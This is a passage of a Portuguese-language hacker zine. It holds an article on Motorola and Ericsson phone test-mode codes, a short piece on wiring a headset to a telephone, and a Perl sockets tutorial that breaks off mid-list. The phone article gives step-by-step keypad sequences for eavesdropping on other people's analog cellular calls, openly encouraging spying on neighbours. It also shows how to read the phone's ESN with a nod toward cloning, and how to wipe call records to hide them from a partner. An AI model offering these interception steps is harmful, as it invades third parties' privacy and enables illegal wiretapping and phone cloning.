xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_           `pcmcia          _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

Celulares Motorola,

Bom, primeira vez que eu escrevo na zine do struck, meu assunto e' sobre
celulares em especial celulares Motorola, mas falarei tambem sobre celulares
Nokia, e um pouco sobre os Ericsson.


Entao vou comecar com alguns comandos dos celulares Motorola.:

1. Ligar: [pwr]
2. Chamda local: Entre com o numero, [snd]
3. Receber chamda: [snd], ou abra o flip.
4. Finalizar uma chamada: [end] ou feche o flip.
5. Gravar numero: numero do telefone, [sto], e coloque 2 digitos para gravar
   na memoria, ou aperte * 2 vezes.
6. Refazer uma chamada: [rcl], e coloque os 2 digitos que foi gravada na memoria.
7. Discagem rapida: coloque os 2 digitos da memoria, [snd]
8. Mudando numeros na gravados na memoria: aperte [rcl], coloque os 2 digitos
   que foi gravada na memoria, entao aparecera'o numero, aperte [clr] e entre
   com o novo numero apertando [snd] depois.
9. Mostrar numero no display: [snd]
10. Microfone mudo: aperte [fcn], [6]
11. Para tirar do modo mudo: aperte [fcn], [6]
12. Travar temporariamente: aperte [fcn], [5] ou [lock]
13. Desbloquear: digite os 3 digitos do codigo, caso apareca uma mensagem de
    erro aperte [clr] depois digite o codigo.
14. Travar automaticamente: [fcn], [6] (nao e' para todos os telefones),
    se compativel aparecera': "enable"
15. Mostrar o codigo de bloqueio: aperte [fcn], [0], seus 6 digitos de codigo
    de seguranca (normalmente [0]), [rcl]
16. Trocando seu codigo de seguranca: aperte [fcn], [0], seus 6 digitos de codigo
    de seguranca (normalmente [0]), e entre com os novos 3 digitos do codigo de
    seguranca, [sto].
17. Ver o nivel da bateria: aperte [fcn], [4]
18. Ajustar o volume: aperte o butao do volume para cima caso queira aumentar-lo
    ou para baixo caso queira diminui-lo.
19. Volume da campainha: [fcn], para cima ou para baixo, como explicado acima.
20. Chamar ultimos numeros usados: [rcl], [0], [0]
21. Mostrar o numero do celular: [rcl], [#]
22. Tempo de chamada individual: [rcl] ,[#], [#]
23. Tempo de chamda resetavel: [rcl] ,[#], [#], [#]
24. Resetar tempo de chamada resetavel: [fcn] , [0], [7], [clr]
25. Tempo de chamda acumulada: [rcl], [#], [#], [#], [#]
26. Revisar informacoes: aperte [fcn], [1]. Para mudar, aperte [*] ou [#] e [clr]
    para mudar. Para sair do menu [end]
27. Revisar status: [fcn], [0], [9], [rcl], [#] ou [*]. Para terminar aperte [end]
28. Trocando tipo de sistema: aperte [rcl], [*], repetidamente aperte [*] ate'
    o tipo de banda que deseja aparecer, e para mudar: [sto]
29. Colocando numero do telefone + nome da pessoa na memoria: digite o numero 
    primeiramente + [sto], [*] + nome da pessoa.

Ai sao alguns dos enumeros comandos que existem no mundo Motorola, agora
vamos para uma parte mais interessante deste texto.


Escuta celular(telefones Motorola): 

Caso voce tenha aqueles antigos celulares Motorola Pt 500 do tempo que a vovo'
era gostosa, tente o primeiro passo: A, caso voce tenha um dos novos, aquela
coisa bunita, pequena e pricipalmente cara, tente o passo: B.

Passo A:

A.1.: Tire a bateria do se celular e localize os pinos de contatos, eles sao 3,
os dois da extremidade (lado direito e lado esquerdo) sao os polos negativo e
positivo do telefone e o do meio e' o do "test mode".
A.2.: Arrume em algum lugar, de preferencia na cozinha, um pedacinho de papel
aluminio, e coloque entre o pino central da bateria e do telefone, depois
coloque a bateria e ligue o celular.
A.3.: Quando voce ligar o telefone nao aparecera o contador de sinal, irao
aparecer numeros piscando. Isso quer dizer que o telefone esta quase pronto
para fazer a escuta.
A.4.: Agora preste atencao para a sequencia de comandos que voce tem que
digitar:

      A.4.1: comece com: [#], ira' aparecer no display: US '
      A.4.2: aperte: [11] + [canal]
      A.4.3: o canal seria um desses: 
             A.4.3.1: [300] <- o melhor canal ;)
             A.4.3.2: [333]
             A.4.3.3: [385]
             A.4.3.4: [799]
             A.4.3.5: [991]
      A.4.4: aperte [#]
      A.4.5: agora [08] e novamente [#]

Apartir deste ultimo passo voce comecara' a ouvir um chiado muito grande e
forte, neste momento ele estara' procurando por conversas, normalmente ele
rastreia conversas perto do local onde voce estaja no momento, quer dizer caso
esteja em um bairro chamado "Yaglandia" voce consequentemente, ouvira'
conversas desta regiao, ehehe quem saiba voce nao pegue daquela sua vizinha
gostosa conversando sacanagem pelo telefone? ;)
Caso queira mudar de canal aperte [07], [#] para deligar o RX Audio e logo
em seguida repita os passos apartir do A.4.2.


Passo B:

B.1.: Se voce esta' lendo essa parte do texto e' porque voce tem muito
dinheiro $$$, heheh talvez tenha um StarTac da New Generation, entao vamos
comecar porque e' mais facil e mais rapido fazer a escuta com esses celulares,
que nao precisam de papel aluminio para ouvir as conversas.
B.2.: Comece com os seguintes passos: 
      B.2.1.: ligue o celular (claro) ;)
      B.2.2.: faca a seguinte sequencia: [fcn], [0], [0], [*], [*], 83786633,
              [sto] (voce acaba de entrar no "test mode")
      B.2.3.: ira' aparecer varios numeros no display (don't worry) caso o seu
              celular seja analogico apenas aperte [#], caso
              seja o novo motorola digital(7790) "segure" [#] por uns 2
              segundos ate' aparecer: US '
      B.2.4.: aperte: [11] + [canal]
      B.2.5.: o canal seria um desses:
              B.2.5.1: [300] <- o melhor canal ;)
              B.2.5.2: [333]
              B.2.5.3: [385]
              B.2.5.4: [799]
              B.2.5.5: [991] 
              B.2.5.6: [333]
      B.2.6.: aperte [#]
      B.2.7.: agora [08] e novamente [#]
 
Apartir deste ultimo passo voce comecara' a ouvir um chiado muito grande e
forte, neste momento ele estara' procurando por conversas, normalmente ele
rastreia conversas de perto do local onde voce estaja no momento, quer dizer
caso esteja em um bairro chamado "Yaglandia" voce consequentemente, ouvira'
conversas desta regiao, ehehe quem saiba voce nao pegue daquela sua vizinha
fofoqueira conversando sacanagem no telefone? ;)
Caso queira mudar de canal aperte [07], [#] para deligar o RX Audio e logo
em seguida repita os passos apartir do B.4.2.


Entendendo o display quando em "test mode":

Caracteres no display no modo analogico   Caracteres no display no modo digital(TDMA)
                                             

       +---------------+                            +---------------+
       | A B C D E F G |                            | A B C D E F G |
       | H I J K L M N |                            | H I J K L M N |                   
       +---------------+                            +---------------+
              ®MOTOROLA                                    ®MOTOROLA

ABC -> Canal                         ABC -> Canal ("A" na posicao indica um canal acima de 1000)
D   -> Processo de modo de chamada   D   -> Processo de modo de chamada
EFG -> RSSI                          EFG -> RSSI
H   -> **(D)SAT                      HIJ -> Verificacao digital codigo (1-255)
I   -> 1=TX on                       K   -> Nivel de forca (0-7)  
J   -> 1=Sinal de Tone On            L   -> 1=TX on 
K   -> Nivel de forca (0-7)          M   -> 1=Bit Error Rate (0-7)
L   -> 1=Controle de canal           N   -> 1=Audio mudo
M   -> 1=RX Audio off                
N   -> 1=TX Audio off                
						  
Processo de modo de chamada:         Processo de modo de chamada:
Espaco em branco = AMPS              Espaco em branco -> AMPS
A   -> NAMPS Alto Sub-Canal          1   -> Slot 1, half rate
B   -> NAMPS Centro Sub-Canal        2   -> Slot 2, half rate
C   -> NAMPS Baixo Sub-Canal         3   -> Slot 3, half rate
              			       4   -> Slot 4, half rate
**(D)SAT:                            5   -> Slot 5, half rate
0   -> 5970 Hz                       6   -> Slot 6, half rate
1   -> 6000 Hz                       7   -> Slot 1, full rate
2   -> 6030 Hz                       8   -> Slot 2, full rate
3   -> Sem SAT                       9   -> Slot 3, full rate
______________

0-6 -> DSAT Vector                                 
7   -> Sem DSAT                                    


Entao isso e' tudo sobre o display do "test mode" da Motorola, caso voce faca
alguma merda no seu celular e' possivel dai' descobrir qual o problema dai'
voce ja' pode se considerar um tecnico da Motorola (hahaha).

Agora vamos mexer profundamente no que diz respeito a programacao do seu
celular Motorola, logo apos de entrar no "test mode" voce podera' seguir
esses seguintes codigos:

00# -> Sem funcao

01# -> Reinicia o celular, em celulares TDMA pode ter a mema funcao do 13#

02# -> Mostra o atual status do seu celular.

03# -> Reseta o timer.

04# -> Inicializa o telefone com as condicoes padrao (de fabrica): Carrier Off
Power Level 0, Receiver Audio Muted, Transmit Audio Muted, Signalling Tone Off,
SAT Off, Resetting of Watch-Dog Timer Enabled, DTMF and Audio Tones Off, Audio
Path Set to Speaker.

05# -> TX Carrier On (Tramite a chave)

06# -> TX Carrier Off

07# -> RX Audio Off (audio mudo)

08# -> RX Audio On (tira do audio mudo)

09# -> TX Audio Off

10# -> TX Audio On

19# -> Mostra a versao do Software do seu celular (4 digitos mostrados como
ano e semana)

25x# -> SAT On          
    x=0, SAT=5970HZ
    x=1, SAT=6000HZ
    x=2, SAT=6030HZ

26# -> SAT Off

32# -> Sem duvida alguma o mais divertido (hehehe) esse comando e' tipo um
rm -rf ~ no linux ou um format C: no ruindows tipo, eu normalmente uso muito
esse comando quando quero me safar, por exemplo ligacoes feitas ou recebidas
da sua "outra" namorada podem ser totalmente deletadas da memoria, quase tudo
e' apagado neste comando, menos as configuracoes para receber ou fazer uma
chamada, quer dizer nao afeta propriamente dito em todo ele, voce podera'
sem problema algum digitar este comando e depois ligar ou receber chamadas de
quem voce quiser, mas um aviso, quando digitares esse comando um bip muito
forte e alto tocara' entao, deixe-o terminar (cerca de 30 a 60 segundos).
Apos isso aperte 01# para reiniciar o celular e enjoy...

34# -> Desliga DTMF.

35# -> Mostra RSSI ("D" Somente serie portavel)

38# -> E' a crianca que todo phreaker gostaria de ter em maos, ele mostra o
ESN (eletronic serial number) em 4 etapas, cada um com 2 digitos hexadecimais,
para "lista-los" aperte [*] sendo a primeira etapa o [00], a segunda [01], a
terceira [02] e a ultima [03]. E' isso ai' mano caso queira brincar mais um
pouco com o ESN pegue esses numeros hexadecimais, e passe-os para decimais e
assim...good phreak!

46# -> Mostra o tempo de chamada acumulado.

48# -> Side Tone On.

49# -> Side Tone Off

53# -> Liga o bip no "test mode", quando equipado.

54# -> Desliga o bip no "test mode", quando equipado.

55# -> Agora sim, vamos para a parte mais animal deste texto, que e' a
programacao propriamente dita do celular, no "test mode" apos voce ter
entrado no "test mode" voce vera' os seguintes dados:

Programacao de dados no "test mode": Para celulares AMPS e NAMPS.  

Passo     digitos/limite        descricao
 01       00000 - 32767        SID (system id) (identificacao do sistema,
                               sua operadora)
 02       8 digitos binarios   opcao de programacao
 03       10 digitos           MIN (codigo da area, e numero do telefone)
 04       2 digitos            station class mark
 05       2 digitos            access overload class
 06       2 digitos            identificacao do grupo (10 nos EUA e 14 no
                               Brasil)
 07       6 digitos            codigo de seguranca
 08       3 digitos            codigo de destravamento (padrao: 123)
 09       3 digitos            nivel do servico (normalmente 04)
 10       8 digitos binarios   opcao de programacao
 11       8 digitos binarios   opcao de programacao
 12       0333 ou 0334         canal inicial
 13       0333                 "A" sistema ipch
 14       0334                 "B" sistema ipch
 15       3 digitos            numero do canal (021 nos EUA e no Brasil)
 16       8 digitos binarios   opcao de programacao

 obs.: Passos 01 ate' 06 e 12 ira' repetir para NAM 2 se o segundo numero de
 telefone tiver sido ativado no passo 11.


Programacao de dados no "test mode": Para celulares TDMA.

Passo     digitos/limite        descricao

 01       00000 - 32767        SID (system id) (identificacao do sistema, sua
                               operadora)
 02       8 digitos binarios   opcao de programacao
 03       10 digitos           MIN (codigo da area, e numero do telefone)
 04       2 digitos            station class mark
 05       2 digitos            access overload class
 06       2 digitos            identificacao do grupo (10 nos EUA e 14 no
                               Brasil)
 07       6 digitos            codigo de seguranca
 08       3 digitos            codigo de travamento (padrao: 123)
 09       3 digitos            nivel do servico (normalmente 04)
 10       8 digitos binarios   opcao de programacao
 11       8 digitos binarios   opcao de programacao
 12       0333 ou 0334         canal inicial
 13       0333                 "A" sistema ipch
 14       0334                 "B" sistema ipch
 15       3 digitos            canal (021 nos EUA e no Brasil)
 16       3 digitos            canal secundario, 708 para banda A e 737 para
                               banda B.
 17       708                  canal secundario para banda A.
 18       737                  canal secundario para banda B.
 19       8 digitos            opcao de programacao


56# -> Ascende todas as luzes do seu celular, caso ele tenha vibra call,
ele tambem usara' essa funcao.

57x# -> Modo do processo de chamada.
     	  x=0, AMPS
	  x=1, NAMPS
	  x=2 ate' 4, reservado
	  x=5, sinal TDMA
	  x=6, sinal com loopback before decoding TDMA 
	  x=7, sinal com loopback voice after decoding TDMA 
	  x=8, sinal com loopback FACCH after decoding TDMA 
	  x=9, sincronizacao forcada TDMA 

58# -> Compander ligado (compressor de audio)

59# -> Compander desligado (compressor de audio)

60# -> Sem funcao

61# -> Trasnferir ESN (somente para series I D.M.T./Mini TAC)

62# -> Ligar o ringer 

63# -> Delisgar o ringer

68# -> Mostra o FLEX e modelo de informacao

E ai? cansou? ta' achando que acabou a materia? nah...
A nossa grandiosa Motorola como sempre pensando em nos deixou mais um codigo
especialmente para um dos ultimos lancamentos o Motorola 7790, 7790i entre
outros. Tipo alguns user's deste modelo nao sabem mudar o "nomezinho"
que aparece no display e tal, mas ja' que eu estou aqui para ensina-los
vai ai o codigo, siga os passos atentamente:

Passo A.	

A.1.: [pwr] -> para liga-lo! (claro!)
A.2.: [#],[7],[7],[6],[4],[7],[2],[6],[#], [send] 
A.3.: aperte [*], para editar a NAM
A.4.: coloque o codigo de seguranca, padrao: [0],[0],[0],[0],[0],[0],[0] 
A.5.: para ir "navegando" ultiliza as teclas: [*] e [#]

DISPLAY (7790i):

	A.5.1.: ESN (em hexadecimal)
		    FCF5DE18	

	A.5.2.: ESN (em decimal)
		    252.16113176

	A.5.3.: MIN
		    0219952354

	A.5.4.: XXXX 00000
      	  0000000000 (isto no 7790i) para o (7790) va' para o A.5.4.1.
		  A.5.4.1. Alfa (modelo 7790)
		 	     (qui voce aperta [sto], e comece a escrever o que quizer, logo depois 
	      	      aperte [sto] novamente para salvar as alteracoes.)

	A.5.5.: SID
		    1666

	A.5.6.: SOC
		    4095

	A.5.7.: Cod Bloq (codigo de bloqueio, 3 (tres) digitos)
		    123 (padrao)

	A.5.8.: Codigo
		  Seg 000000 (padrao)

	A.5.9.: p/ Nivel 2
		 (ch., Scan)

	A.5.10.: p/ Nivel 3
      	  (PRSID)

	A.5.10.: p/ Nivel 4
      	  ( Misc. )

	A.5.11.: Sair 
		  (para sair, use a tecla [send], depois [*] caso tenha feito alguma 
	         alteracao, caso contrario [#] para nao salvar.

Este modelo em que foi mostrado acima (7790i) nao permite a troca do "nomezinho"
pelo teclado, nesses casos voce tera' que mandar para operadora ou talvez para
uma assistencia tecnica para poder mudar. Ja' o 7790 (sem o "i") voce pode mudar
manualmente, so' de uma olhada no A.5.4.1

Se voce e' um bom observador percebera' que as teclas "7764726" significa
"program" leia nas teclas. 
Ufa, agora eu acho que acaba por aqui a parte dos celulares motorola, ;) 
agora vamos para a parte dos celulares Ericsson.


Celulares Ericsson, (faca o mundo te ouvir)

Nao serao muitas coisas sobre os celulares Ericsson, mas o suficiente
para voce curtir com amigos seus, so...enjoy!
Vamos comecar com a escuta celular, estes passos servem para a maioria
dos celulares Ericsson 318, 368, 388, 618 e 688. (modelos velhos) caso o
seu modelos seja um desses citados acima siga o passo A, caso contrario
o seu seja um modelo tipo o Ericsson kf-788 ou t18d ou quem sabe o novissimo
t20 (rulez), siga entao o passo B abaixo descrito.


Passo A.

A.1.: Segure a tecla [fcn], logo, digite os seguintes numeros: 904059
A.2.: Solte a tecla [fcn], entao consequentemente aparecera no display
      a mensagem "TEST INPUT"
A.3.: Aperte as teclas: 1 * 1 # 0 1 # #
A.4.: Agora voce acaba de entrar no canal 01, caso nao esteja gostando
      muito da conversa basta ir mundando os canais na tecla volume.
A.5.: E finalmente, voce deve estar se perguntando, como eu posso sair 
      deste "TEST INPUT" o unico jeito e' tirando a bateria mano. \(")/


Passo B.

B.1.: Ligue o celular e tal ;)
B.2.: Digite: 904059 + seta para baixo. (aparecera' no display "TEST SET")
B.3.: [yes], [1], [seta para cima]
B.4.: [yes], [8], [6].
B.5.: [yes], [3], [clear], [0], [0], [0], [numero com ate' 3 digitos].
        e.g. -> B.5.1.: [yes], [3], [clear], [0], [0], [0], [1], [0],[0].
	Voce acaba de entrar no canal 100.
	e.g. -> B.5.2.: [yes], [3], [clear], [0], [0], [0], [2], [0], [0].
	Voce acaba de entrar no canal 200.
	e.g. -> B.5.3.: [yes], [3], [clear], [0], [0], [0], [3], [0], [0].
	Voce acaba de entrar no canal 300.
	e.g. -> B.5.4.: [yes], [3], [clear], [0], [0], [0], [4], [0], [0].
	Voce acaba de entrar no canal 400.

Entendendo o passo B.5., esse: "[numero com ate' 3 digitos]", que consta no
passo citado acima, esses tres numeros a ser digitados sao os canais que voce 
entra para escutar uma conversa, voce escolhe um canal de 0 a 400, mas 
normalmente o que pega mais conversas e' o canal 300, mas caso seja do contra
tente de um por um ;)

Tem um outro codigo ai que eu descobri, que nao serve pra muita coisa nao,
mas descobri que ele tem quase a mesma funcao do "field test" dos celulares
Nokia, e "test mode" dos celulares Motorola, o codigo e' o seguinte:

Passo A.

A.1.: Ligue o celular, (duh!)
A.2.: Digite: [9], [0], [4], [0], [9], [0]
A.3.: Seta para baixo.

Apartir do passo A.3. aparecera' uma porrada de numeros no seu display,
como o canal em que ele esta' usando no momento entre outros.
Caso queria sair deste codigo, nao tente tirar a bateria do celular, pois nao
adiantara' nada!, faca novamente os passos para sair deste modo, caso 
apareca a seguinte linha no display "invalid password", segure [clear] por 
2 segundos, e digite a senha do seu celular, depois repita o passo A.2.

Nao terminei essa merda por falta de tempo mesmo, mas sem duvida alguma
seria a zine mais completa sobre celulares, entao pra nao ficar
aqui no meu pc sem fazer nada acabei por mandar para um velho amigo
meu o struck, valeu manow ;)
um abraco CARTI :)
ae DAVEMUSTAINE :)
by `pcmcia 
e-mail: dr28@visto.com










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~     12 - Phreak Boxes      ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Rastermition        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

         COMO LIGAR UM FONE DE OUVIDO E UM MICROFONE EM SEU TELEFONE
                                                      por Rastermition
                                                            15/07/2001


Materiais:

-Um fone de ouvido qualquer(de walkman, etc...)
-Um microfone qualquer
-Um telefone(ohhhhhh)

Procedimentos:

Bem, em primeiro lugar você terá que sacrificar o fio do seu fone e do seu
microfone.

Corte o fio do Fone de Ouvido e do Microfone, de preferência ao meio(pois
a parte do fio com o pino macho pode ter outras utilidades).

Pegue o fio que ficou ligado ao fone de ouvido e ao microfone e descasque-o.
Provavelmente terão dois fios dentro dele(no meu fone de ouvido tinham três).
Se tiver dois, ligue-os no fio do telefone(ou você descasca o fio do 
telefone ou entao liga os fios diretamente no plug onde você encaixa na 
parede e tals. Não sabe como ligar os fios diretamente no plug? Tudo bem...
eu explico...  Veja o desenho abaixo:

              _________________
             |                 |
             |     1      | 2  |
             |   ____     |    |
             |                 |   (figura retirada da PhreaKhaos)
             |                 |
             |    |       |    |
             |    | 3     | 4  |
             |                 |
             |_________________|


Ligue os fios nos pinos 1 e 2(os fios do fone e do microfone, logico)


Caso tenham três fios, bem, vou dizer o que eu fiz.
Quando descasquei o fio do meu fone, tinham três fios: um branco, um azul 
e um vermelho. Simplesmente isolei o branco e usei o azul e o vermelho, e 
funcionou legal...


Funcionamento:

Ao retirar o telefone do gancho, você poderá usar o fone de ouvido para 
ouvir e o microfone para falar, sem precisar utilizar o telefone(ohhhhhhhh,
que conclusão genial!).


Final:

Bem, é só isso...qualquer coisa, dúvidas, etc, mail-me.

Contato:
mIRC: Rastermition - Canais: #phreak #phreaker
E-mail: rastermition@ieg.com.br










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~     13 - Perl Sockets      ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_           BEHAEL           _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

Bem eh o seguinte nao sou muito bom para ensinar como minhas proprias
palavras por isso vou usar as definicoes oficiais do Perl Guia Completo
para explicar melhor... ae vc se perguntar: quer dizer q essa materia
vai ser uma copia do guia... NAO! =:), afinal eu aprendi com ele e 
outros livros e tudo q eu foce explicar seria baseado no que eu aprendi
por isso digo sim vou me basear no guia. Melhor dizer no que vou me 
basear do que fazer algo "parecido" com ele e fazer com que as pessoas
pensem q eu sou o "tal" em perl =:) espero que gostem. Ah estarei 
colocando algumas palavras um pouco fora do comum para algumas pessoas
direto do dicionario para q se tenha uma melhor interpretacao. 


INTRO




Soquetes segundo o guia:

"Mecanismos subjacente* para a rede na Internet." 
*subjacente: adj.2g. (lat. subjacens) 1. Que esta ou jaz por baixo. 
 2. Fig. Que nao se manifesta claramente; oculto, *subentendido. 
*subentendido: adj. Que se percebe, apesar de nao ter sido expresso.

-> Observando as definicoes do dicionario podemos entender melhor oq o
   guia nos disse sobre soquetes.

Uma aplicacao servidor estarah aguardando conexoes na porta 6667. Vc 
com uma aplicacao cliente vai utilizar do servico do servidor para 
conectar na porta 6667.
Vc ----> Irc Server. Oq vai rolar ae eh uma conversinha entre os dois 
uma coisa bem intima.

Cliente: Oi servidor posso conectar na sua porta hum.. q tal... 
Servidor: Claro q pode estou sempre aqui para receber Ui. =:P

Hehehe nao eh bem assim mais eh quase isso. =:)




Uso dos soquetes segundo o guia:

"Uma aplicacao (um servidor) fica em uma porta aguardando as conexoes. 
Outra aplicacao (o cliente) conecta essa porta e diz olah; entao o 
cliente e o servidor tem um bate-papo. Sua conversacao real eh feita 
com qualquer q seja o protocolo escolhido --- por exemplo, um cliente 
e um servidor Web usariam o HTTP e um servidor e-mail usaria o POP3 e 
o SMTP, etc."

-> Como eu disse no comeco eu nao expliquei muito diferente do guia 
   apenas usei um pouco de comedia na minha explicacao =:)




Tipos de transmissao segundo o guia:

1) Dados de Fluxo: Vem e vao continuadamente numa conexao. Ex: TCP 
   usado para processar os dados de fluxo para que todos os dados sejam
   devidamente recebidos e ordenados.

2) Pacotes de Dados Separados: Envio de dados na rede em partes 
   separadas. Ex: UDP.




Mais Info do guia:

Tipos de soquetes:

1) Dominio da Internet: Requerem um vinculo* cuidadoso e atribuicao do
   tipo adequado de endereco imposto pelo Internet Protocol (IP) 
   *vinculo: s.m. (lat. vinculum). 1. Laço, liame, antilho  2. Fig. 
   Laço moral, relaçao.

2) Dominio Unix: Conexoes entre as aplicacoes na mesma maquina ou em 
   uma LAN. Esquema de enderecamento simples baseado no nome do 
   processo e destino.

Bom acho que pra quem tem interesse essa leve introducao deu pra 
levar... alguns vao ficar por ae me chamando de rippador de livro ou 
coisa parecida q eu nao sei fazer nada =:) 
oh pra vcs: =========D~~~~~~~___*___). tou gozando no cuh de vcs. =:)
 




REQUISITOS

Os requisitos para programacao de soquetes em perl: 
1) Saber o basico sobre a liguagem; 
2) Ter instalado o perl(*nix) ou active perl (windows); 
3) Para a parte basica apenas o suporte ao modulo socket, para as 
   demais ter suporte aos modulos: IO::Socket; 
4) Paciencia. =:)




SOQUETES

Segundo o requisito numero 1 vc deve ter o minimo de conhecimento em 
perl... isso nao quer dizer q quem nao conheca nada nao deve ler... 
pelo contrario leia sim informacao nunca eh d+. =:)

Bom olha oq eu vou fazer antes de iniciarmos os programas usando 
soquetes em perl achei melhor colocar todas as funcoes aqui para que vc
possa consultar sempre que tiver uma duvida como eu expliquei antes o 
Guia eh o nosso melhor amigo aqui. Explicando as funcoes aqui quando 
iniciarmos os programas nao serah necessario ficar colocando parte por 
parte do programa para explicar oq tem lah eh soh vc voltar aqui e 
consultar por isso essa parte vai ser retirada com o extract =:).

<++> Soquetes/Funcoes.txt

Funcoes Predefinidas, Modulo Socket e IO::Socket =:) segundo o Guia.

############### Funcoes Predefinidas. ###############

As seguintes funcoes sao predefinidas para a programacao de soquete.



1) socket:

sintaxe: socket soquete, dominio, tipo, protocolo

Abre um soquete do tipo especificado e anexa-o ao handle de arquivo 
soquete. O dominio, o tipo e o protocolo sao especificados como para
socket. Antes de usar esta funcao, seu programa devera conter a linha:

use Socket;

Esta definicao fornecera as devidas constantes. A funcao retornara true
se tiver sucesso.

Ex: socket(SOQUETE, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die $!;




2) bind: 

sintaxe: bind soquete, endereco

Anexa um endereco a um soquete ja aberto especificado pelo handle de 
arquivo soquete. A funcao retornara true se for bem-sucedida e false do
contrario (e colocara o codigo do erro em $!). O endereco devera ser um
endereco compactado do devido tipo do soquete.

Ex: bind (SOQUETE, sockaddr_in(80, INADDR_ANY));




3) listen:

sintaxe: listen soquete, tamanho_da_fila

Informa ao sistema operacional que vc esta pronto para aceitar as 
conexoes no soquete e define o numero de conexoes que aguardam para o 
tamanho_da_fila. Se a fila estiver cheia, os clientes que tentam 
conectar o soquete terao a conexao recusada. Usada apenas para os 
soquetes do lado do servidor.

Ex: listen (SOQUETE, 5);




4) accept:

sintaxe: accept novo_soquete, soquete_generico

Prepara um processo do servidor para aceitar as conexoes de soquete dos
clientes. A execucao e suspensa ate que uma conexao seja feita, neste 
momento o handle de arquivo novo_soquete e aberto e anexado a conexao 
feita recentemente. A funcao retornara o endereco conectado se a 
chamada tiver sucesso, do contrario, retornara false ( colocando o erro
em $!). O soquete_generico tera que ser um handle de arquivo ja aberto
atraves da funcao socket e vinculado a um dos enderecos de rede do 
servidor. E usado apenas no lado do servidor.

Ex: accept (NEW_SOCKET, SOQUETE) or die $!;




5) connect;

sintaxe: connect soquete, endereco

Inicia uma conexao com outro processo que esta aguardando em uma accept
no handle de arquivo soquete. A funcao retornara true para o sucesso, 
do contrario retornara false (colocando o erro em $!). O endereco e um
endereco da rede compactado do devido tipo de soquete. Para desconectar
um soquete, use close ou shutdown(8). Usado apenas no lado do cliente.

ex: connect(SOQUETE, sockaddr_in(21, inet_aton('ftp.slackware.com')) or die $!;




6) recv:

sintaxe: recv soquete, $var, comprimento, marcas

Recebe uma mensagem em um soquete. Tenta receber os bytes de comprimento
dos dados na variavel var a partir do handle de arquivo soquete 
especificado. A funcao retornara o endereco do emissor ou um valor 
indefinido se ouver um erro. A var aumentara ou diminuira segundo o 
comprimento atualmente lido. A funcao tem as mesmas marcas da chamada 
do sistema recv.

Ex: recv (SOQUETE, $buffer);




7) send: sintaxe: send soquete, msg, marcas, [dest]

Envia uma mensagem msg em um soquete. Tem as mesmas marcas da chamada do
sistema com nome igual -- veja send(2). Nos soquetes desconectados, voce
tera que especificar um destino dest para enviar, neste caso send 
funcionara como a sendto. A funcao retornara o numero de bytes enviados
ou um valor indefinido se houver um erro. No caso de erro, colocara o 
codigo de erro em $!.

ex: $msg = "fuck";
    send(SOQUETE, $msg);




8) shutdown (ou close)

sintaxe: shutdown soquete, como

Finaliza uma conexao de soquete da maneira indicada por como. Se como 
for 0, mais recebimentos serao recusados. Se como for 1, mais envios 
serao recusados. Se como for 2, tudo sera recusado.

Ex: shutdown (SOQUETE, 0);

sintaxe: close handle_de_arquivo

Fecha o arquivo, o soquete ou o canal associado ao determinado handle de
arquivo.

Ex: close(SOQUETE);




############### Funcoes do modulo Socket: ###############

1) inet_aton
sintaxe: inet_aton(nome_host);

Converte um nome do host como www.algumacoisa.com.br ou 200.217.98.100 
em uma estrutura de dados (uma string com quatro bytes) usada para os 
enderecos de soquete. Se o nome do host nao puder ser resolvido, a 
funcao retornara um valor indefinido.



2) inet_ntoa
sintaxe: inet_ntoa(string_ender);

Converte uma string de endereco com quatro bytes (como retornado por 
inet_aton) em uma string com a forma de quatro do endereco IP com pontos.



3) sockaddr_in
sintaxe: sockaddr_in(porta, string_ender);
         pack_sockaddr_in(porta, string_ender);

Obtem um numero da porta e uma string_ender com quatro bytes (como 
retornado por inet_aton) e retorna a estrutura de endereco do soquete 
inclusive os argumentos compactados com o argumento AF_INET. Essa 
estrutura e normalmente o que voce precisara para os argumentos em bind,
connect e send e e tambem retornada por getpeername, getsockname e recv.



4) sockaddr_un
sintaxe: sockaddr_un(nome_caminho);
         pack_sockaddr_un(nome_caminho);

Obtem um argumento, um nome do caminho e retorna a estrutura do endereco
de soquete do dominio Unix (o caminho compactado com AF_UNIX preenchido).
Para os soquetes do dominio Unix, essa estrutura e normalmente o que voce
precisara para os argumentos em bind, connect e send e e tambem retornada
oir getpeername, getsockname e recv.



5) unpack_sockaddr_in
sintaxe: unpack_sockaddr_in(ender_soquete);
         sockaddr_in(ender_soquete);

Obtem uma estrutura de endereco do soquete e retorna uma array de dois 
elementos (no contexto da lista): o numero da porta e o endereco de IP 
com quatro bytes.



6) unpack_sockaddr_un
sintaxe: unpack_sockaddr_un(ender_soquete_un);
         sockaddr_un(ender_soquete_un);

Obtem uma estrutura de endereco do soquete do dominio Unix (como 
retornado por sockaddr_un) e retorna o nome do caminho.




############### Constantes do modulo Socket: ###############

1) INADDR_ANY

A string compactada com quatro bytes para o endereco IP curinga que 
especifica qualquer endereco do host (se o host tiver varios enderecos).
E equivalente a inet_aton('0.0.0.0').



2) INADDR_BROADCAST

A string compactada com quatro bytes para o endereco de transmissao 
publica. E equivalente a inet_aton('255.255.255.255').



3) INADDR_LOOPBACK

A string compactada com quatro bytes para o endereco de loopback. E 
equivalente a ient_aton('localhost').



4) INADDR_NONE

